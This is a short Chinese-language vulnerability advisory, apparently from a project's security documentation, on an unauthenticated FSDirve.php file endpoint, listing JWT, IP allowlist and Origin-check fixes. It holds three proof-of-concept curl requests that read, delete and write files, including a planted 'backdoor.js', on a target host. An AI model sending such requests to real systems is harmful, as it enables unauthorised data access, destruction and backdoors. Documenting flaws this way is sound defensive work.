# 8.4.1 CVS-ZEROS-008: FSDirve 未授权远程文件操作

## 漏洞概述

**漏洞编号**: CVS-ZEROS-008  
**严重程度**: 严重 (CVSS 9.1)  
**状态**: 已修复

### 漏洞描述

FSDirve.php 缺少任何形式的身份验证，允许同一局域网内的恶意系统通过直接构造 HTTP 请求执行文件删除、创建、修改等操作。

### 攻击方式

```bash
# 读取任意文件
curl "http://target:8089/system/service/FSDirve.php?action=read_file&path=D:/secret.txt"

# 删除任意文件
curl -X POST "http://target:8089/system/service/FSDirve.php?action=delete_file&path=D:/important.txt"

# 写入文件
curl -X POST "http://target:8089/system/service/FSDirve.php?action=write_file&path=D:/backdoor.js&content=<script>..."
```

### 修复方案

1. **JWT 验证**：所有操作必须携带有效 JWT Token
2. **IP 白名单**：限制可访问的 IP 地址
3. **Origin 检查**：验证请求来源

---

## 本节小结

1. **漏洞**：FSDirve 完全开放访问
2. **修复**：JWT 验证 + IP 白名单
